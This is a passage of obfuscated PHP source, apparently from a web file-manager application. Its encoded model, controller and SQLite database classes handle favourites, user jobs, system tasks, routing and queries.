$ÎÙ•Æ¾[$¢£ÜÌ›[510]]); $¦ş‰‰ÀÁ = explode($¢£ÜÌ›[50], $‹ïÖÃÅ[$¢£ÜÌ›[510]]); if (count($“ıñÊ À) > count($¦ş‰‰ÀÁ)) { $ÎÙ•Æ¾ = $‹ïÖÃÅ; } } return $ÎÙ•Æ¾ ? $ÎÙ•Æ¾[$¢£ÜÌ›[495]] : $¢£ÜÌ›[12]; } public function sort($¢Éôõç, $øøéçš†) { return parent::update($¢Éôõç, $øøéçš†); } } goto B¹ª¹—†Ì; B¹ª¹—†Ì: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\164\x61\x73\x6b\114\x69\x73\164"; public $field = array("\156\x61\155\145", "\x74\x79\x70\145", "\145\166\x65\156\164", "\x74\151\155\145", "\144\145\163\143", "\163\x79\163\x74\x65\x6d", "\x65\x6e\x61\x62\x6c\145", "\x6c\141\163\164\x52\x75\x6e", "\x73\157\162\164"); public function listData($ã“ãÊÀò = false, $¨Ø²õ¾ğ = "\163\157\x72\164", $Ñ™Áë‘ğ = false) { return parent::listData($ã“ãÊÀò, $¨Ø²õ¾ğ, $Ñ™Áë‘ğ); } public function add($Æ—«ğƒş) { $ÌË‰ª‡… =& $_SERVER[‘ÆÜ‘œ]; $–ßç„¶ = $this->findByName($Æ—«ğƒş[$ÌË‰ª‡…[32]]); if ($–ßç„¶) { return !1; } $Æ—«ğƒş[$ÌË‰ª‡…[1881]] = 0; $Æ—«ğƒş[$ÌË‰ª‡…[2158]] = $this->getSort(); return parent::insert($Æ—«ğƒş); } private function getSort() { $ê—©‹·Ğ =& $_SERVER[‘ÆÜ‘œ]; $•¨¹ÄÉ = parent::listData(); $ä¥¶õ¼É = array_to_keyvalue($•¨¹ÄÉ, $ê—©‹·Ğ[12], $ê—©‹·Ğ[2158]); return empty($ä¥¶õ¼É) ? 0 : max($ä¥¶õ¼É) + 1; } public function update($¯õ×½Éè, $¸‰•ŞĞÎ) { $ÑÈşş“ =& $_SERVER[‘ÆÜ‘œ]; $í–í•Àô = $this->listData($¯õ×½Éè); $ãùÓ—ˆÙ = $this->findByName($¸‰•ŞĞÎ[$ÑÈşş“[32]]); if (!$í–í•Àô || $ãùÓ—ˆÙ && $ãùÓ—ˆÙ[$ÑÈşş“[495]] != $í–í•Àô[$ÑÈşş“[495]]) { return !1; } return parent::update($¯õ×½Éè, $¸‰•ŞĞÎ); } public function remove($È’·×¹•, $ˆÈñ¶”í = false) { $Š€•À÷ =& $_SERVER[‘ÆÜ‘œ]; $éªœŞî• = $this->listData($È’·×¹•); if (!$éªœŞî•) { return; } if (!$ˆÈñ¶”í && $éªœŞî•[$Š€•À÷[190]] == $Š€•À÷[91]) { return !1; } return parent::remove($È’·×¹•); } public function enable($Ö²Ë¯›ã, $†öõÊ) { return $this->update($Ö²Ë¯›ã, array($_SERVER[‘ÆÜ‘œ][2613] => $†öõÊ)); } public function run($Ì”Ûš¨û) { return $this->update($Ì”Ûš¨û, array($_SERVER[‘ÆÜ‘œ][2625] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($¶»úÄ¼ş) { $ˆßºÉÕò =& $_SERVER[‘ÆÜ‘œ]; return array($ˆßºÉÕò[2248] => array(USER_ID, $ˆßºÉÕò[2626])); } protected function ___listData() { $°‘ùëÅ€ =& $_SERVER[‘ÆÜ‘œ]; $¾®³şóã = array($°‘ùëÅ€[1921] => USER_ID, $°‘ùëÅ€[581] => 0); $”îğİ—Ï = $°‘ùëÅ€[2627]; $ÒšÓÍÜœ = $this->field($”îğİ—Ï)->where($¾®³şóã)->order($°‘ùëÅ€[2628])->select(); return $ÒšÓÍÜœ ? $ÒšÓÍÜœ : array(); } protected function resetCache() { } protected function listView() { $ª•ÌËú =& $_SERVER[‘ÆÜ‘œ]; $â™ÄÇâ = $this->listData(); $ÒŠıÛ»ô = array_filter_by_field($â™ÄÇâ, $ª•ÌËú[33], $ª•ÌËú[513]); $ÒÀĞıìİ = array_to_keyvalue($ÒŠıÛ»ô, $ª•ÌËú[12], $ª•ÌËú[87]); if (!$ÒÀĞıìİ) { return $â™ÄÇâ; } $ïØßçµı = 2000; $®ùæ˜Äå = array($ª•ÌËú[514] => array($ª•ÌËú[515], $ÒÀĞıìİ)); $¶ğ Õœ = Model($ª•ÌËú[939])->listSource($®ùæ˜Äå, $ïØßçµı); $¶ğ Õœ = array_merge($¶ğ Õœ[$ª•ÌËú[86]], $¶ğ Õœ[$ª•ÌËú[85]]); $¶ğ Õœ = array_to_keyvalue($¶ğ Õœ, $ª•ÌËú[192]); foreach ($â™ÄÇâ as $Œî—Ó· => $Ä€ÒÃ¼¢) { $•‚ñ¦©ı = $¶ğ Õœ[$Ä€ÒÃ¼¢[$ª•ÌËú[87]]]; $•‚ñ¦©ı = $•‚ñ¦©ı ? $•‚ñ¦©ı : array(); $â™ÄÇâ[$Œî—Ó·] = array_merge($•‚ñ¦©ı, $Ä€ÒÃ¼¢); } return $â™ÄÇâ; } protected function addFav($ĞßŒõİ±, $ƒšŸÔöæ = '', $¿µœüÃº = "\163\x6f\x75\x72\x63\x65") { $Ã§ñßÕ´ =& $_SERVER[‘ÆÜ‘œ]; $ö™Òß¦§ = array($Ã§ñßÕ´[1921] => USER_ID, $Ã§ñßÕ´[581] => 0, $Ã§ñßÕ´[519] => $¿µœüÃº, $Ã§ñßÕ´[518] => $ĞßŒõİ±); if ($this->where($ö™Òß¦§)->find()) { return !1; } $ö™Òß¦§ = array($Ã§ñßÕ´[1921] => USER_ID, $Ã§ñßÕ´[581] => 0); $›§÷çÄë = $this->where($ö™Òß¦§)->max($Ã§ñßÕ´[2158]); if (!$›§÷çÄë) { $›§÷çÄë = 0; } if (!$ƒšŸÔöæ && $¿µœüÃº == $Ã§ñßÕ´[513]) { $éº÷Æ“Ë = Model($Ã§ñßÕ´[1484])->where(array($Ã§ñßÕ´[514] => $ĞßŒõİ±))->find(); if (!$éº÷Æ“Ë) { return !1; } $ƒšŸÔöæ = $éº÷Æ“Ë[$Ã§ñßÕ´[32]]; } $ƒšŸÔöæ = $this->getAutoName($ƒšŸÔöæ); $ûÚ˜¡Ø = array($Ã§ñßÕ´[1921] => USER_ID, $Ã§ñßÕ´[581] => 0, $Ã§ñßÕ´[517] => $ƒšŸÔöæ, $Ã§ñßÕ´[518] => $ĞßŒõİ±, $Ã§ñßÕ´[519] => $¿µœüÃº, $Ã§ñßÕ´[2140] => $›§÷çÄë + 1); return $this->add($ûÚ˜¡Ø); } protected function remove($Ê¿¿ªËß) { $Ğ”ë’¶ù =& $_SERVER[‘ÆÜ‘œ]; $ÁÀ„÷®ô = array($Ğ”ë’¶ù[1921] => USER_ID, $Ğ”ë’¶ù[516] => $Ê¿¿ªËß); return $this->where($ÁÀ„÷®ô)->delete(); } protected function removeByName($òÈç„ëš) { $­ê¸†¹İ =& $_SERVER[‘ÆÜ‘œ]; $üÏñáîÜ = array($­ê¸†¹İ[1921] => USER_ID, $­ê¸†¹İ[517] => $òÈç„ëš, $­ê¸†¹İ[581] => 0); return $this->where($üÏñáîÜ)->delete(); } protected function rename($®ÊŞ•¯, $„ı•ß¦) { $®ˆâšøµ =& $_SERVER[‘ÆÜ‘œ]; if ($®ÊŞ•¯ == $„ı•ß¦) { return !1; } $Ù’¸¬…á = $this->getAutoName($„ı•ß¦); if ($„ı•ß¦ != $Ù’¸¬…á) { return !1; } $—² ªâ™ = array($®ˆâšøµ[1921] => USER_ID, $®ˆâšøµ[581] => 0, $®ˆâšøµ[32] => $®ÊŞ•¯); return $this->where($—² ªâ™)->save(array($®ˆâšøµ[32] => $„ı•ß¦)); } protected function resetSort($˜ş„ùèŒ) { $‹µ‰×ã =& $_SERVER[‘ÆÜ‘œ]; $˜ş„ùèŒ = is_array($˜ş„ùèŒ) ? $˜ş„ùèŒ : array(); $••ÀË = array($‹µ‰×ã[1921] => USER_ID); for ($Ï²Üº = 0; $Ï²Üº < count($˜ş„ùèŒ); $Ï²Üº++) { $••ÀË[$‹µ‰×ã[516]] = $˜ş„ùèŒ[$Ï²Üº]; $this->where($••ÀË)->save(array($‹µ‰×ã[2140] => $Ï²Üº + 1)); } return !0; } protected function moveTop($æ¬óç¶) { $î¹è½Æ‚ =& $_SERVER[‘ÆÜ‘œ]; $À™òİÕ· = array($î¹è½Æ‚[1921] => USER_ID, $î¹è½Æ‚[581] => 0); $¾Ş‘¯¦ê = $this->where($À™òİÕ·)->where(array($î¹è½Æ‚[32] => $æ¬óç¶))->find(); if (!$¾Ş‘¯¦ê) { return; } $¡Ù›ëÎ = $this->field($î¹è½Æ‚[495])->where($À™òİÕ·)->order($î¹è½Æ‚[2628])->select(); $¡Ù›ëÎ = array_to_keyvalue($¡Ù›ëÎ, $î¹è½Æ‚[12], $î¹è½Æ‚[495]); $Çù¶¤Ş¹ = $¡Ù›ëÎ; $¡Ù›ëÎ = array_remove_value($¡Ù›ëÎ, $¾Ş‘¯¦ê[$î¹è½Æ‚[495]]); array_unshift($¡Ù›ëÎ, $¾Ş‘¯¦ê[$î¹è½Æ‚[495]]); return $this->resetSort($¡Ù›ëÎ); } protected function moveBottom($ÀŸÀùí) { $æ«Ñ£ÕŞ =& $_SERVER[‘ÆÜ‘œ]; $ÌÉ± õù = array($æ«Ñ£ÕŞ[1921] => USER_ID, $æ«Ñ£ÕŞ[581] => 0); $ûÔûù»Ñ = $this->where($ÌÉ± õù)->max($æ«Ñ£ÕŞ[2158]); $™”î‹µ‡ = array($æ«Ñ£ÕŞ[2158] => $ûÔûù»Ñ + 1); return $this->where($ÌÉ± õù)->where(array($æ«Ñ£ÕŞ[32] => $ÀŸÀùí))->save($™”î‹µ‡); } private function getAutoName($ÉîÛä¸í) { $Û½Éî… =& $_SERVER[‘ÆÜ‘œ]; $ÉÉ Æ¢œ = array($Û½Éî…[1921] => USER_ID, $Û½Éî…[581] => 0); $ˆ›ÛÈÄ¶ = $this->field($Û½Éî…[32])->where($ÉÉ Æ¢œ)->select(); $ˆ›ÛÈÄ¶ = array_to_keyvalue($ˆ›ÛÈÄ¶, $Û½Éî…[12], $Û½Éî…[32]); if (!$ˆ›ÛÈÄ¶ || !in_array($ÉîÛä¸í, $ˆ›ÛÈÄ¶)) { return $ÉîÛä¸í; } for ($—‰’ßÊ¢ = 0; $—‰’ßÊ¢ < count($ˆ›ÛÈÄ¶); $—‰’ßÊ¢++) { if (!in_array($ÉîÛä¸í . "\x28{$—‰’ßÊ¢}\x29", $ˆ›ÛÈÄ¶)) { return $ÉîÛä¸í . "\50{$—‰’ßÊ¢}\51"; } } return $ÉîÛä¸í . "\x28{$—‰’ßÊ¢}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x6a\x6f\x62\114\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x64\x65\163\x63", "\x73\x6f\x72\164"); const JOB_KEY = "\163\x65\x6c\146\x4a\157\142\114\x69\x73\164"; public function listData($ØÂúÌ¾Å = false, $­–Ûûí = "\163\x6f\x72\164", $‚ğÉüøû = false) { return parent::listData($ØÂúÌ¾Å, $­–Ûûí, $‚ğÉüøû); } public function remove($ëë©‹³ø) { return parent::remove($ëë©‹³ø); } public function add($¤Ô§úÌ½) { $Úóö½ãœ =& $_SERVER[‘ÆÜ‘œ]; if ($this->findByName($¤Ô§úÌ½[$Úóö½ãœ[32]])) { return !1; } $¤Ô§úÌ½[$Úóö½ãœ[2158]] = $this->getSort(); return parent::insert($¤Ô§úÌ½); } private function getSort() { $ëƒËŠˆ© =& $_SERVER[‘ÆÜ‘œ]; $‹–¥…á = parent::listData(); $âÚ´ëÏ = array_to_keyvalue($‹–¥…á, $ëƒËŠˆ©[12], $ëƒËŠˆ©[2158]); return empty($âÚ´ëÏ) ? 0 : max($âÚ´ëÏ) + 1; } public function update($è‚º¦¼é, $îœÃÉ—Ñ) { $¶øãô¼ =& $_SERVER[‘ÆÜ‘œ]; $Îó®”ÄÖ = parent::listData($è‚º¦¼é); $ÄØ‰Í€ = $this->findByName($îœÃÉ—Ñ[$¶øãô¼[32]]); if (!$Îó®”ÄÖ || $ÄØ‰Í€ && $ÄØ‰Í€[$¶øãô¼[495]] != $Îó®”ÄÖ[$¶øãô¼[495]]) { return !1; } return parent::update($è‚º¦¼é, $îœÃÉ—Ñ); } public function setUserJob($°Ê®ØÅ‰, $ÌÌÈ¦š) { $§¹Ö£ˆ¤ =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($ÌÌÈ¦š)) { $ÌÌÈ¦š = array($ÌÌÈ¦š); } $”ËÓš× = parent::listData(); $É¦×é¬ğ = array_to_keyvalue($”ËÓš×, $§¹Ö£ˆ¤[32]); $Õı®ºïÔ = $§¹Ö£ˆ¤[472]; foreach ($ÌÌÈ¦š as $–˜•¨Ğ‡) { if ($É¦×é¬ğ[$–˜•¨Ğ‡]) { $Õı®ºïÔ .= $É¦×é¬ğ[$–˜•¨Ğ‡][$§¹Ö£ˆ¤[495]] . $§¹Ö£ˆ¤[50]; } else { $Ë´ôé§ò = $this->add($–˜•¨Ğ‡); $Õı®ºïÔ .= $Ë´ôé§ò . $§¹Ö£ˆ¤[50]; } } $Õı®ºïÔ = rtrim($Õı®ºïÔ, $§¹Ö£ˆ¤[50]); Model($§¹Ö£ˆ¤[625])->metaSet($°Ê®ØÅ‰, self::JOB_KEY, $Õı®ºïÔ); } public function getUserJob($¿¤¤ŒÑ¶) { $Æ•¨ûúî = Model($_SERVER[‘ÆÜ‘œ][625])->metaGet($¿¤¤ŒÑ¶); return $this->getUserJobInfo($Æ•¨ûúî[self::JOB_KEY]); } public function getUserJobInfo($‚éïŠ÷) { $Çœî£—Ö =& $_SERVER[‘ÆÜ‘œ]; $Æ‰ˆğÚ = explode($Çœî£—Ö[50], $‚éïŠ÷); $ğñ½á¨ = parent::listData(); $ğñ½á¨ = array_remove_key($ğñ½á¨, $Çœî£—Ö[232]); $¾­±ó¿• = array(); foreach ($Æ‰ˆğÚ as $Î¹Éğšê) { if (isset($ğñ½á¨[$Î¹Éğšê])) { $¾­±ó¿•[] = $ğñ½á¨[$Î¹Éğšê]; } } return $¾­±ó¿•; } } goto BË‰îç•; FÍÓ¶‘Ø™¤: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $÷ÉèÄı =& $_SERVER[‘ÆÜ‘œ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$÷ÉèÄı[6]] =& $config; $this->values[$÷ÉèÄı[7]] =& $in; $this->tpl = TEMPLATE . MOD . $÷ÉèÄı[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($—©‹İ) { if (1 === func_num_args()) { $this->{$—©‹İ} = new $—©‹İ(); } else { $›ƒĞÁ¹Ø = new ReflectionClass($—©‹İ); $ºï¬ÒÍ‹ = func_get_args(); array_shift($ºï¬ÒÍ‹); $this->{$—©‹İ} = $›ƒĞÁ¹Ø->newInstanceArgs($ºï¬ÒÍ‹); } return $this->{$—©‹İ}; } public function routeBind($â¨‚ˆÂä, $¢™ÛÉğ¾, $¡¥ØÀèé = 3) { $ÄôĞı÷ =& $_SERVER[‘ÆÜ‘œ]; $ÙĞ¿ĞŞ = $this->in[$ÄôĞı÷[9]]; $â¨‚ˆÂä = str_replace($ÄôĞı÷[10], $ÄôĞı÷[11], trim(trim($â¨‚ˆÂä, $ÄôĞı÷[8]), $ÄôĞı÷[12])); if (!$â¨‚ˆÂä || count($ÙĞ¿ĞŞ) <= $¡¥ØÀèé) { return !1; } $øÛş©ı = !0; $²òò¢ = explode($ÄôĞı÷[8], $â¨‚ˆÂä); for ($†Çã¾“ = 0; $†Çã¾“ < count($²òò¢); $†Çã¾“++) { if ($²òò¢[$†Çã¾“] != $ÙĞ¿ĞŞ[$¡¥ØÀèé + $†Çã¾“]) { $øÛş©ı = !1; break; } } if (!$øÛş©ı) { return; } call_user_func_array(array($this, $¢™ÛÉğ¾), array()); } public function routeArgs($¬«¹–›ã = 3) { $£¡×Îôı = $this->in[$_SERVER[‘ÆÜ‘œ][9]]; if (count($£¡×Îôı) <= $¬«¹–›ã) { return array(); } $ş•ã¡û = array(); for ($Óàñê¸ñ = $¬«¹–›ã; $Óàñê¸ñ < count($£¡×Îôı); $Óàñê¸ñ += 2) { $ş•ã¡û[$£¡×Îôı[$Óàñê¸ñ]] = $£¡×Îôı[$Óàñê¸ñ + 1]; $this->in[$£¡×Îôı[$Óàñê¸ñ]] = $£¡×Îôı[$Óàñê¸ñ + 1]; } return $ş•ã¡û; } protected function assign($¥ŠÎ¼ú—, $Ş´¬‘èƒ) { $this->values[$¥ŠÎ¼ú—] = $Ş´¬‘èƒ; } protected function display($ Ÿ¿×ìÜ) { ob_end_clean(); extract($this->values); require $this->tpl . $ Ÿ¿×ìÜ; } } class DbSqliteBase extends Db { public function __construct($ó”Óİ¯í = '') { $¦­ÈĞëÏ =& $_SERVER[‘ÆÜ‘œ]; if (!extension_loaded($¦­ÈĞëÏ[13])) { think_exception(think_lang($¦­ÈĞëÏ[14]) . $¦­ÈĞëÏ[15]); } if (!empty($ó”Óİ¯í)) { if (!isset($ó”Óİ¯í[$¦­ÈĞëÏ[16]])) { $ó”Óİ¯í[$¦­ÈĞëÏ[16]] = 438; } $this->config = $ó”Óİ¯í; if (empty($this->config[$¦­ÈĞëÏ[17]])) { $this->config[$¦­ÈĞëÏ[17]] = array(); } } } public function connect($­Ï•¾‚Ô = '', $°ú³ˆ‰ú = 0) { $³Ë®ôÖµ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->linkID[$°ú³ˆ‰ú])) { if (empty($­Ï•¾‚Ô)) { $­Ï•¾‚Ô = $this->config; } $¦½ØöÅú = !empty($­Ï•¾‚Ô[$³Ë®ôÖµ[17]][$³Ë®ôÖµ[18]]) ? $­Ï•¾‚Ô[$³Ë®ôÖµ[17]][$³Ë®ôÖµ[18]] : $this->pconnect; $¾÷´ü›ƒ = $¦½ØöÅú ? $³Ë®ôÖµ[19] : $³Ë®ôÖµ[20]; $this->linkID[$°ú³ˆ‰ú] = $¾÷´ü›ƒ($­Ï•¾‚Ô[$³Ë®ôÖµ[21]], $­Ï•¾‚Ô[$³Ë®ôÖµ[16]]); if (!$this->linkID[$°ú³ˆ‰ú]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$°ú³ˆ‰ú], 30000); if (1 != think_config($³Ë®ôÖµ[22])) { unset($this->config); } } return $this->linkID[$°ú³ˆ‰ú]; } public function free() { $this->queryID = null; } public function query($ÎÏˆ¦Û) { $¦„¶Û´­ =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÎÏˆ¦Û; if ($this->queryID) { $this->free(); } think_action_status($¦„¶Û´­[23], 1); think_status($¦„¶Û´­[24]); $this->queryID = sqlite_query($this->_linkID, $ÎÏˆ¦Û); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ñ¾Ÿá = $this->getAll(); return $Ñ¾Ÿá; } } public function execute($ÂÛŒÁğº) { $¾Û‰¬çğ =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÂÛŒÁğº; if ($this->queryID) { $this->free(); } think_action_status($¾Û‰¬çğ[25], 1); think_status($¾Û‰¬çğ[24]); $È¾ŞØ„ı = sqlite_exec($this->_linkID, $ÂÛŒÁğº); $this->debug(); if (!1 === $È¾ŞØ„ı) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‘ÆÜ‘œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $×ó¨±Áê = sqlite_query($this->_linkID, $_SERVER[‘ÆÜ‘œ][27]); if (!$×ó¨±Áê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÎòÜò³« = sqlite_query($this->_linkID, $_SERVER[‘ÆÜ‘œ][28]); if (!$ÎòÜò³«) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‹ıß¹ö = array(); if ($this->numRows > 0) { for ($óçãäÁ = 0; $óçãäÁ < $this->numRows; $óçãäÁ++) { $‹ıß¹ö[$óçãäÁ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $‹ıß¹ö; } public function getFields($Ìœˆ†¹ç) { $Ò€¸„Ù¯ =& $_SERVER[‘ÆÜ‘œ]; $øç‹°Ü· = $this->query($Ò€¸„Ù¯[29] . $Ìœˆ†¹ç . $Ò€¸„Ù¯[30]); $§ÎÌó­ = array(); if ($øç‹°Ü·) { foreach ($øç‹°Ü· as $•Ê¤ƒ€ => $ÂØ¼·”È) { $§ÎÌó­[$ÂØ¼·”È[$Ò€¸„Ù¯[31]]] = array($Ò€¸„Ù¯[32] => $ÂØ¼·”È[$Ò€¸„Ù¯[31]], $Ò€¸„Ù¯[33] => $ÂØ¼·”È[$Ò€¸„Ù¯[34]], $Ò€¸„Ù¯[35] => (bool) ($ÂØ¼·”È[$Ò€¸„Ù¯[36]] === $Ò€¸„Ù¯[12]), $Ò€¸„Ù¯[37] => $ÂØ¼·”È[$Ò€¸„Ù¯[38]], $Ò€¸„Ù¯[39] => strtolower($ÂØ¼·”È[$Ò€¸„Ù¯[40]]) == $Ò€¸„Ù¯[41], $Ò€¸„Ù¯[42] => strtolower($ÂØ¼·”È[$Ò€¸„Ù¯[43]]) == $Ò€¸„Ù¯[44]); } } return $§ÎÌó­; } public function getTables($¿½ĞìÛë = '') { $ÄıÉÊ›ü =& $_SERVER[‘ÆÜ‘œ]; $İ§Ô’ä‚ = $this->query($ÄıÉÊ›ü[45] . $ÄıÉÊ›ü[46] . $ÄıÉÊ›ü[47]); $×ô¯şùÉ = array(); foreach ($İ§Ô’ä‚ as $¡®àÒü  => $Œô·•–) { $×ô¯şùÉ[$¡®àÒü ] = current($Œô·•–); } return $×ô¯şùÉ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $éëØŒ–« =& $_SERVER[‘ÆÜ‘œ]; $£“Íç’İ = sqlite_last_error($this->_linkID); $this->error = $£“Íç’İ . $éëØŒ–«[4] . sqlite_error_string($£“Íç’İ); if ($éëØŒ–«[12] != $this->queryStr) { $this->error .= LNG($éëØŒ–«[48]) . $this->queryStr; } think_trace($this->error, $éëØŒ–«[12], $éëØŒ–«[49]); return $this->error; } public function escapeString($‘ÙªŒœî) { return sqlite_escape_string($‘ÙªŒœî); } public function parseLimit($í½ïñÓû) { $Á”¯Ñ»¾ =& $_SERVER[‘ÆÜ‘œ]; $½ÃÑúóé = $Á”¯Ñ»¾[12]; if (!empty($í½ïñÓû)) { $í½ïñÓû = explode($Á”¯Ñ»¾[50], $í½ïñÓû); if (count($í½ïñÓû) > 1) { $½ÃÑúóé .= $Á”¯Ñ»¾[51] . $í½ïñÓû[1] . $Á”¯Ñ»¾[52] . $í½ïñÓû[0] . $Á”¯Ñ»¾[53]; } else { $½ÃÑúóé .= $Á”¯Ñ»¾[51] . $í½ïñÓû[0] . $Á”¯Ñ»¾[53]; } } return $½ÃÑúóé; } } class DbSqlite3Base extends Db { public function __construct($Èö„ü”ì = '') { $Àº§³Ø =& $_SERVER[‘ÆÜ‘œ]; if (!class_exists($Àº§³Ø[54])) { think_exception(think_lang($Àº§³Ø[14]) . $Àº§³Ø[55]); } if (!empty($Èö„ü”ì)) { if (!isset($Èö„ü”ì[$Àº§³Ø[16]])) { $Èö„ü”ì[$Àº§³Ø[16]] = 438; } $this->config = $Èö„ü”ì; if (empty($this->config[$Àº§³Ø[17]])) { $this->config[$Àº§³Ø[17]] = array(); } } } public function connect($¯Øë—î = '', $Î¯Ò‡ä = 0) { $Á¢ñ¤”„ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->linkID[$Î¯Ò‡ä])) { if (empty($¯Øë—î)) { $¯Øë—î = $this->config; } $this->linkID[$Î¯Ò‡ä] = new SQLite3($¯Øë—î[$Á¢ñ¤”„[21]]); if (!$this->linkID[$Î¯Ò‡ä]) { think_exception($this->linkID[$Î¯Ò‡ä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Î¯Ò‡ä]->busyTimeout(30000); if (1 != think_config($Á¢ñ¤”„[22])) { unset($this->config); } } return $this->linkID[$Î¯Ò‡ä]; } public function free() { $this->queryID = null; } public function query($ÈèÆíñ) { $€¢½Öî =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÈèÆíñ; if ($this->queryID) { $this->free(); } think_action_status($€¢½Öî[23], 1); think_status($€¢½Öî[24]); $this->queryID = $this->_linkID->query($ÈèÆíñ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $’’‹×·Ò = $this->getAll(); $this->numRows = count($’’‹×·Ò); return $’’‹×·Ò; } } public function execute($ÊÂúç¥’) { $Æææ¼¦Ë =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊÂúç¥’; if ($this->queryID) { $this->free(); } think_action_status($Æææ¼¦Ë[25], 1); think_status($Æææ¼¦Ë[24]); $¯õ­ŸºŒ = $this->_linkID->exec($ÊÂúç¥’); $this->debug(); if (!1 === $¯õ­ŸºŒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‘ÆÜ‘œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $öì˜œ® = $this->_linkID->query($_SERVER[‘ÆÜ‘œ][27]); if (!$öì˜œ®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Òµ€²§† = $this->_linkID->query($_SERVER[‘ÆÜ‘œ][28]); if (!$Òµ€²§†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¯õİ”ùß = array(); while ($Äøî¢åÌ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¯õİ”ùß[] = $Äøî¢åÌ; } $this->queryID->reset(); return $¯õİ”ùß; } public function getFields($¢ş¸¼ù²) { $™—µêÅ® =& $_SERVER[‘ÆÜ‘œ]; $µÄá Ì® = $this->query($™—µêÅ®[29] . $¢ş¸¼ù² . $™—µêÅ®[30]); $»ïº²õâ = array(); if ($µÄá Ì®) { foreach ($µÄá Ì® as $İû¸ÕŞ => $¼²÷ºğ°) { $»ïº²õâ[$¼²÷ºğ°[$™—µêÅ®[32]]] = array($™—µêÅ®[32] => $¼²÷ºğ°[$™—µêÅ®[32]], $™—µêÅ®[33] => $¼²÷ºğ°[$™—µêÅ®[33]], $™—µêÅ®[35] => (bool) ($¼²÷ºğ°[$™—µêÅ®[35]] === $™—µêÅ®[12]), $™—µêÅ®[37] => $¼²÷ºğ°[$™—µêÅ®[56]], $™—µêÅ®[39] => (bool) $¼²÷ºğ°[$™—µêÅ®[57]], $™—µêÅ®[42] => (bool) $¼²÷ºğ°[$™—µêÅ®[57]]); } } return $»ïº²õâ; } public function getTables($‰××óì‹ = '') { $‹İ«ïĞÆ =& $_SERVER[‘ÆÜ‘œ]; $ÚÑ£ª° = $this->query($‹İ«ïĞÆ[45] . $‹İ«ïĞÆ[46] . $‹İ«ïĞÆ[47]); $ºÛØâÖ = array(); foreach ($ÚÑ£ª° as $ÌßÌ´Óª => $Ğæö³…ß) { $ºÛØâÖ[$ÌßÌ´Óª] = current($Ğæö³…ß); } return $ºÛØâÖ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¹µŸ«æâ =& $_SERVER[‘ÆÜ‘œ]; $this->error = $this->_linkID->lastErrorMsg(); if ($¹µŸ«æâ[12] != $this->queryStr) { $this->error .= LNG($¹µŸ«æâ[48]) . $this->queryStr; } think_trace($this->error, $¹µŸ«æâ[12], $¹µŸ«æâ[49]); return $this->error; } public function escapeString($Ğê¨ÑšÏ) { $¼¤Öí¤ê =& $_SERVER[‘ÆÜ‘œ]; if ($this->_linkID) { return $this->_linkID->escapeString($Ğê¨ÑšÏ); } return str_ireplace($¼¤Öí¤ê[58], $¼¤Öí¤ê[59], $Ğê¨ÑšÏ); } public function parseLimit($Ì˜¿¾›’) { $„ºàÓ»† =& $_SERVER[‘ÆÜ‘œ]; $ëêÈÅõä = $„ºàÓ»†[12]; if (!empty($Ì˜¿¾›’)) { $Ì˜¿¾›’ = explode($„ºàÓ»†[50], $Ì˜¿¾›’); if (count($Ì˜¿¾›’) > 1) { $ëêÈÅõä .= $„ºàÓ»†[51] . $Ì˜¿¾›’[1] . $„ºàÓ»†[52] . $Ì˜¿¾›’[0] . $„ºàÓ»†[53]; } else { $ëêÈÅõä .= $„ºàÓ»†[51] . $Ì˜¿¾›’[0] . $„ºàÓ»†[53]; } } return $ëêÈÅõä; } } goto A—Œ‰î—Ê‚; aÉà»Îñ˜ï: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\x65\155\x4f\160\164\151\157\156"; public $field = array(); public function listData($¹œ£… = false, $¿ÍîÁ³¹ = 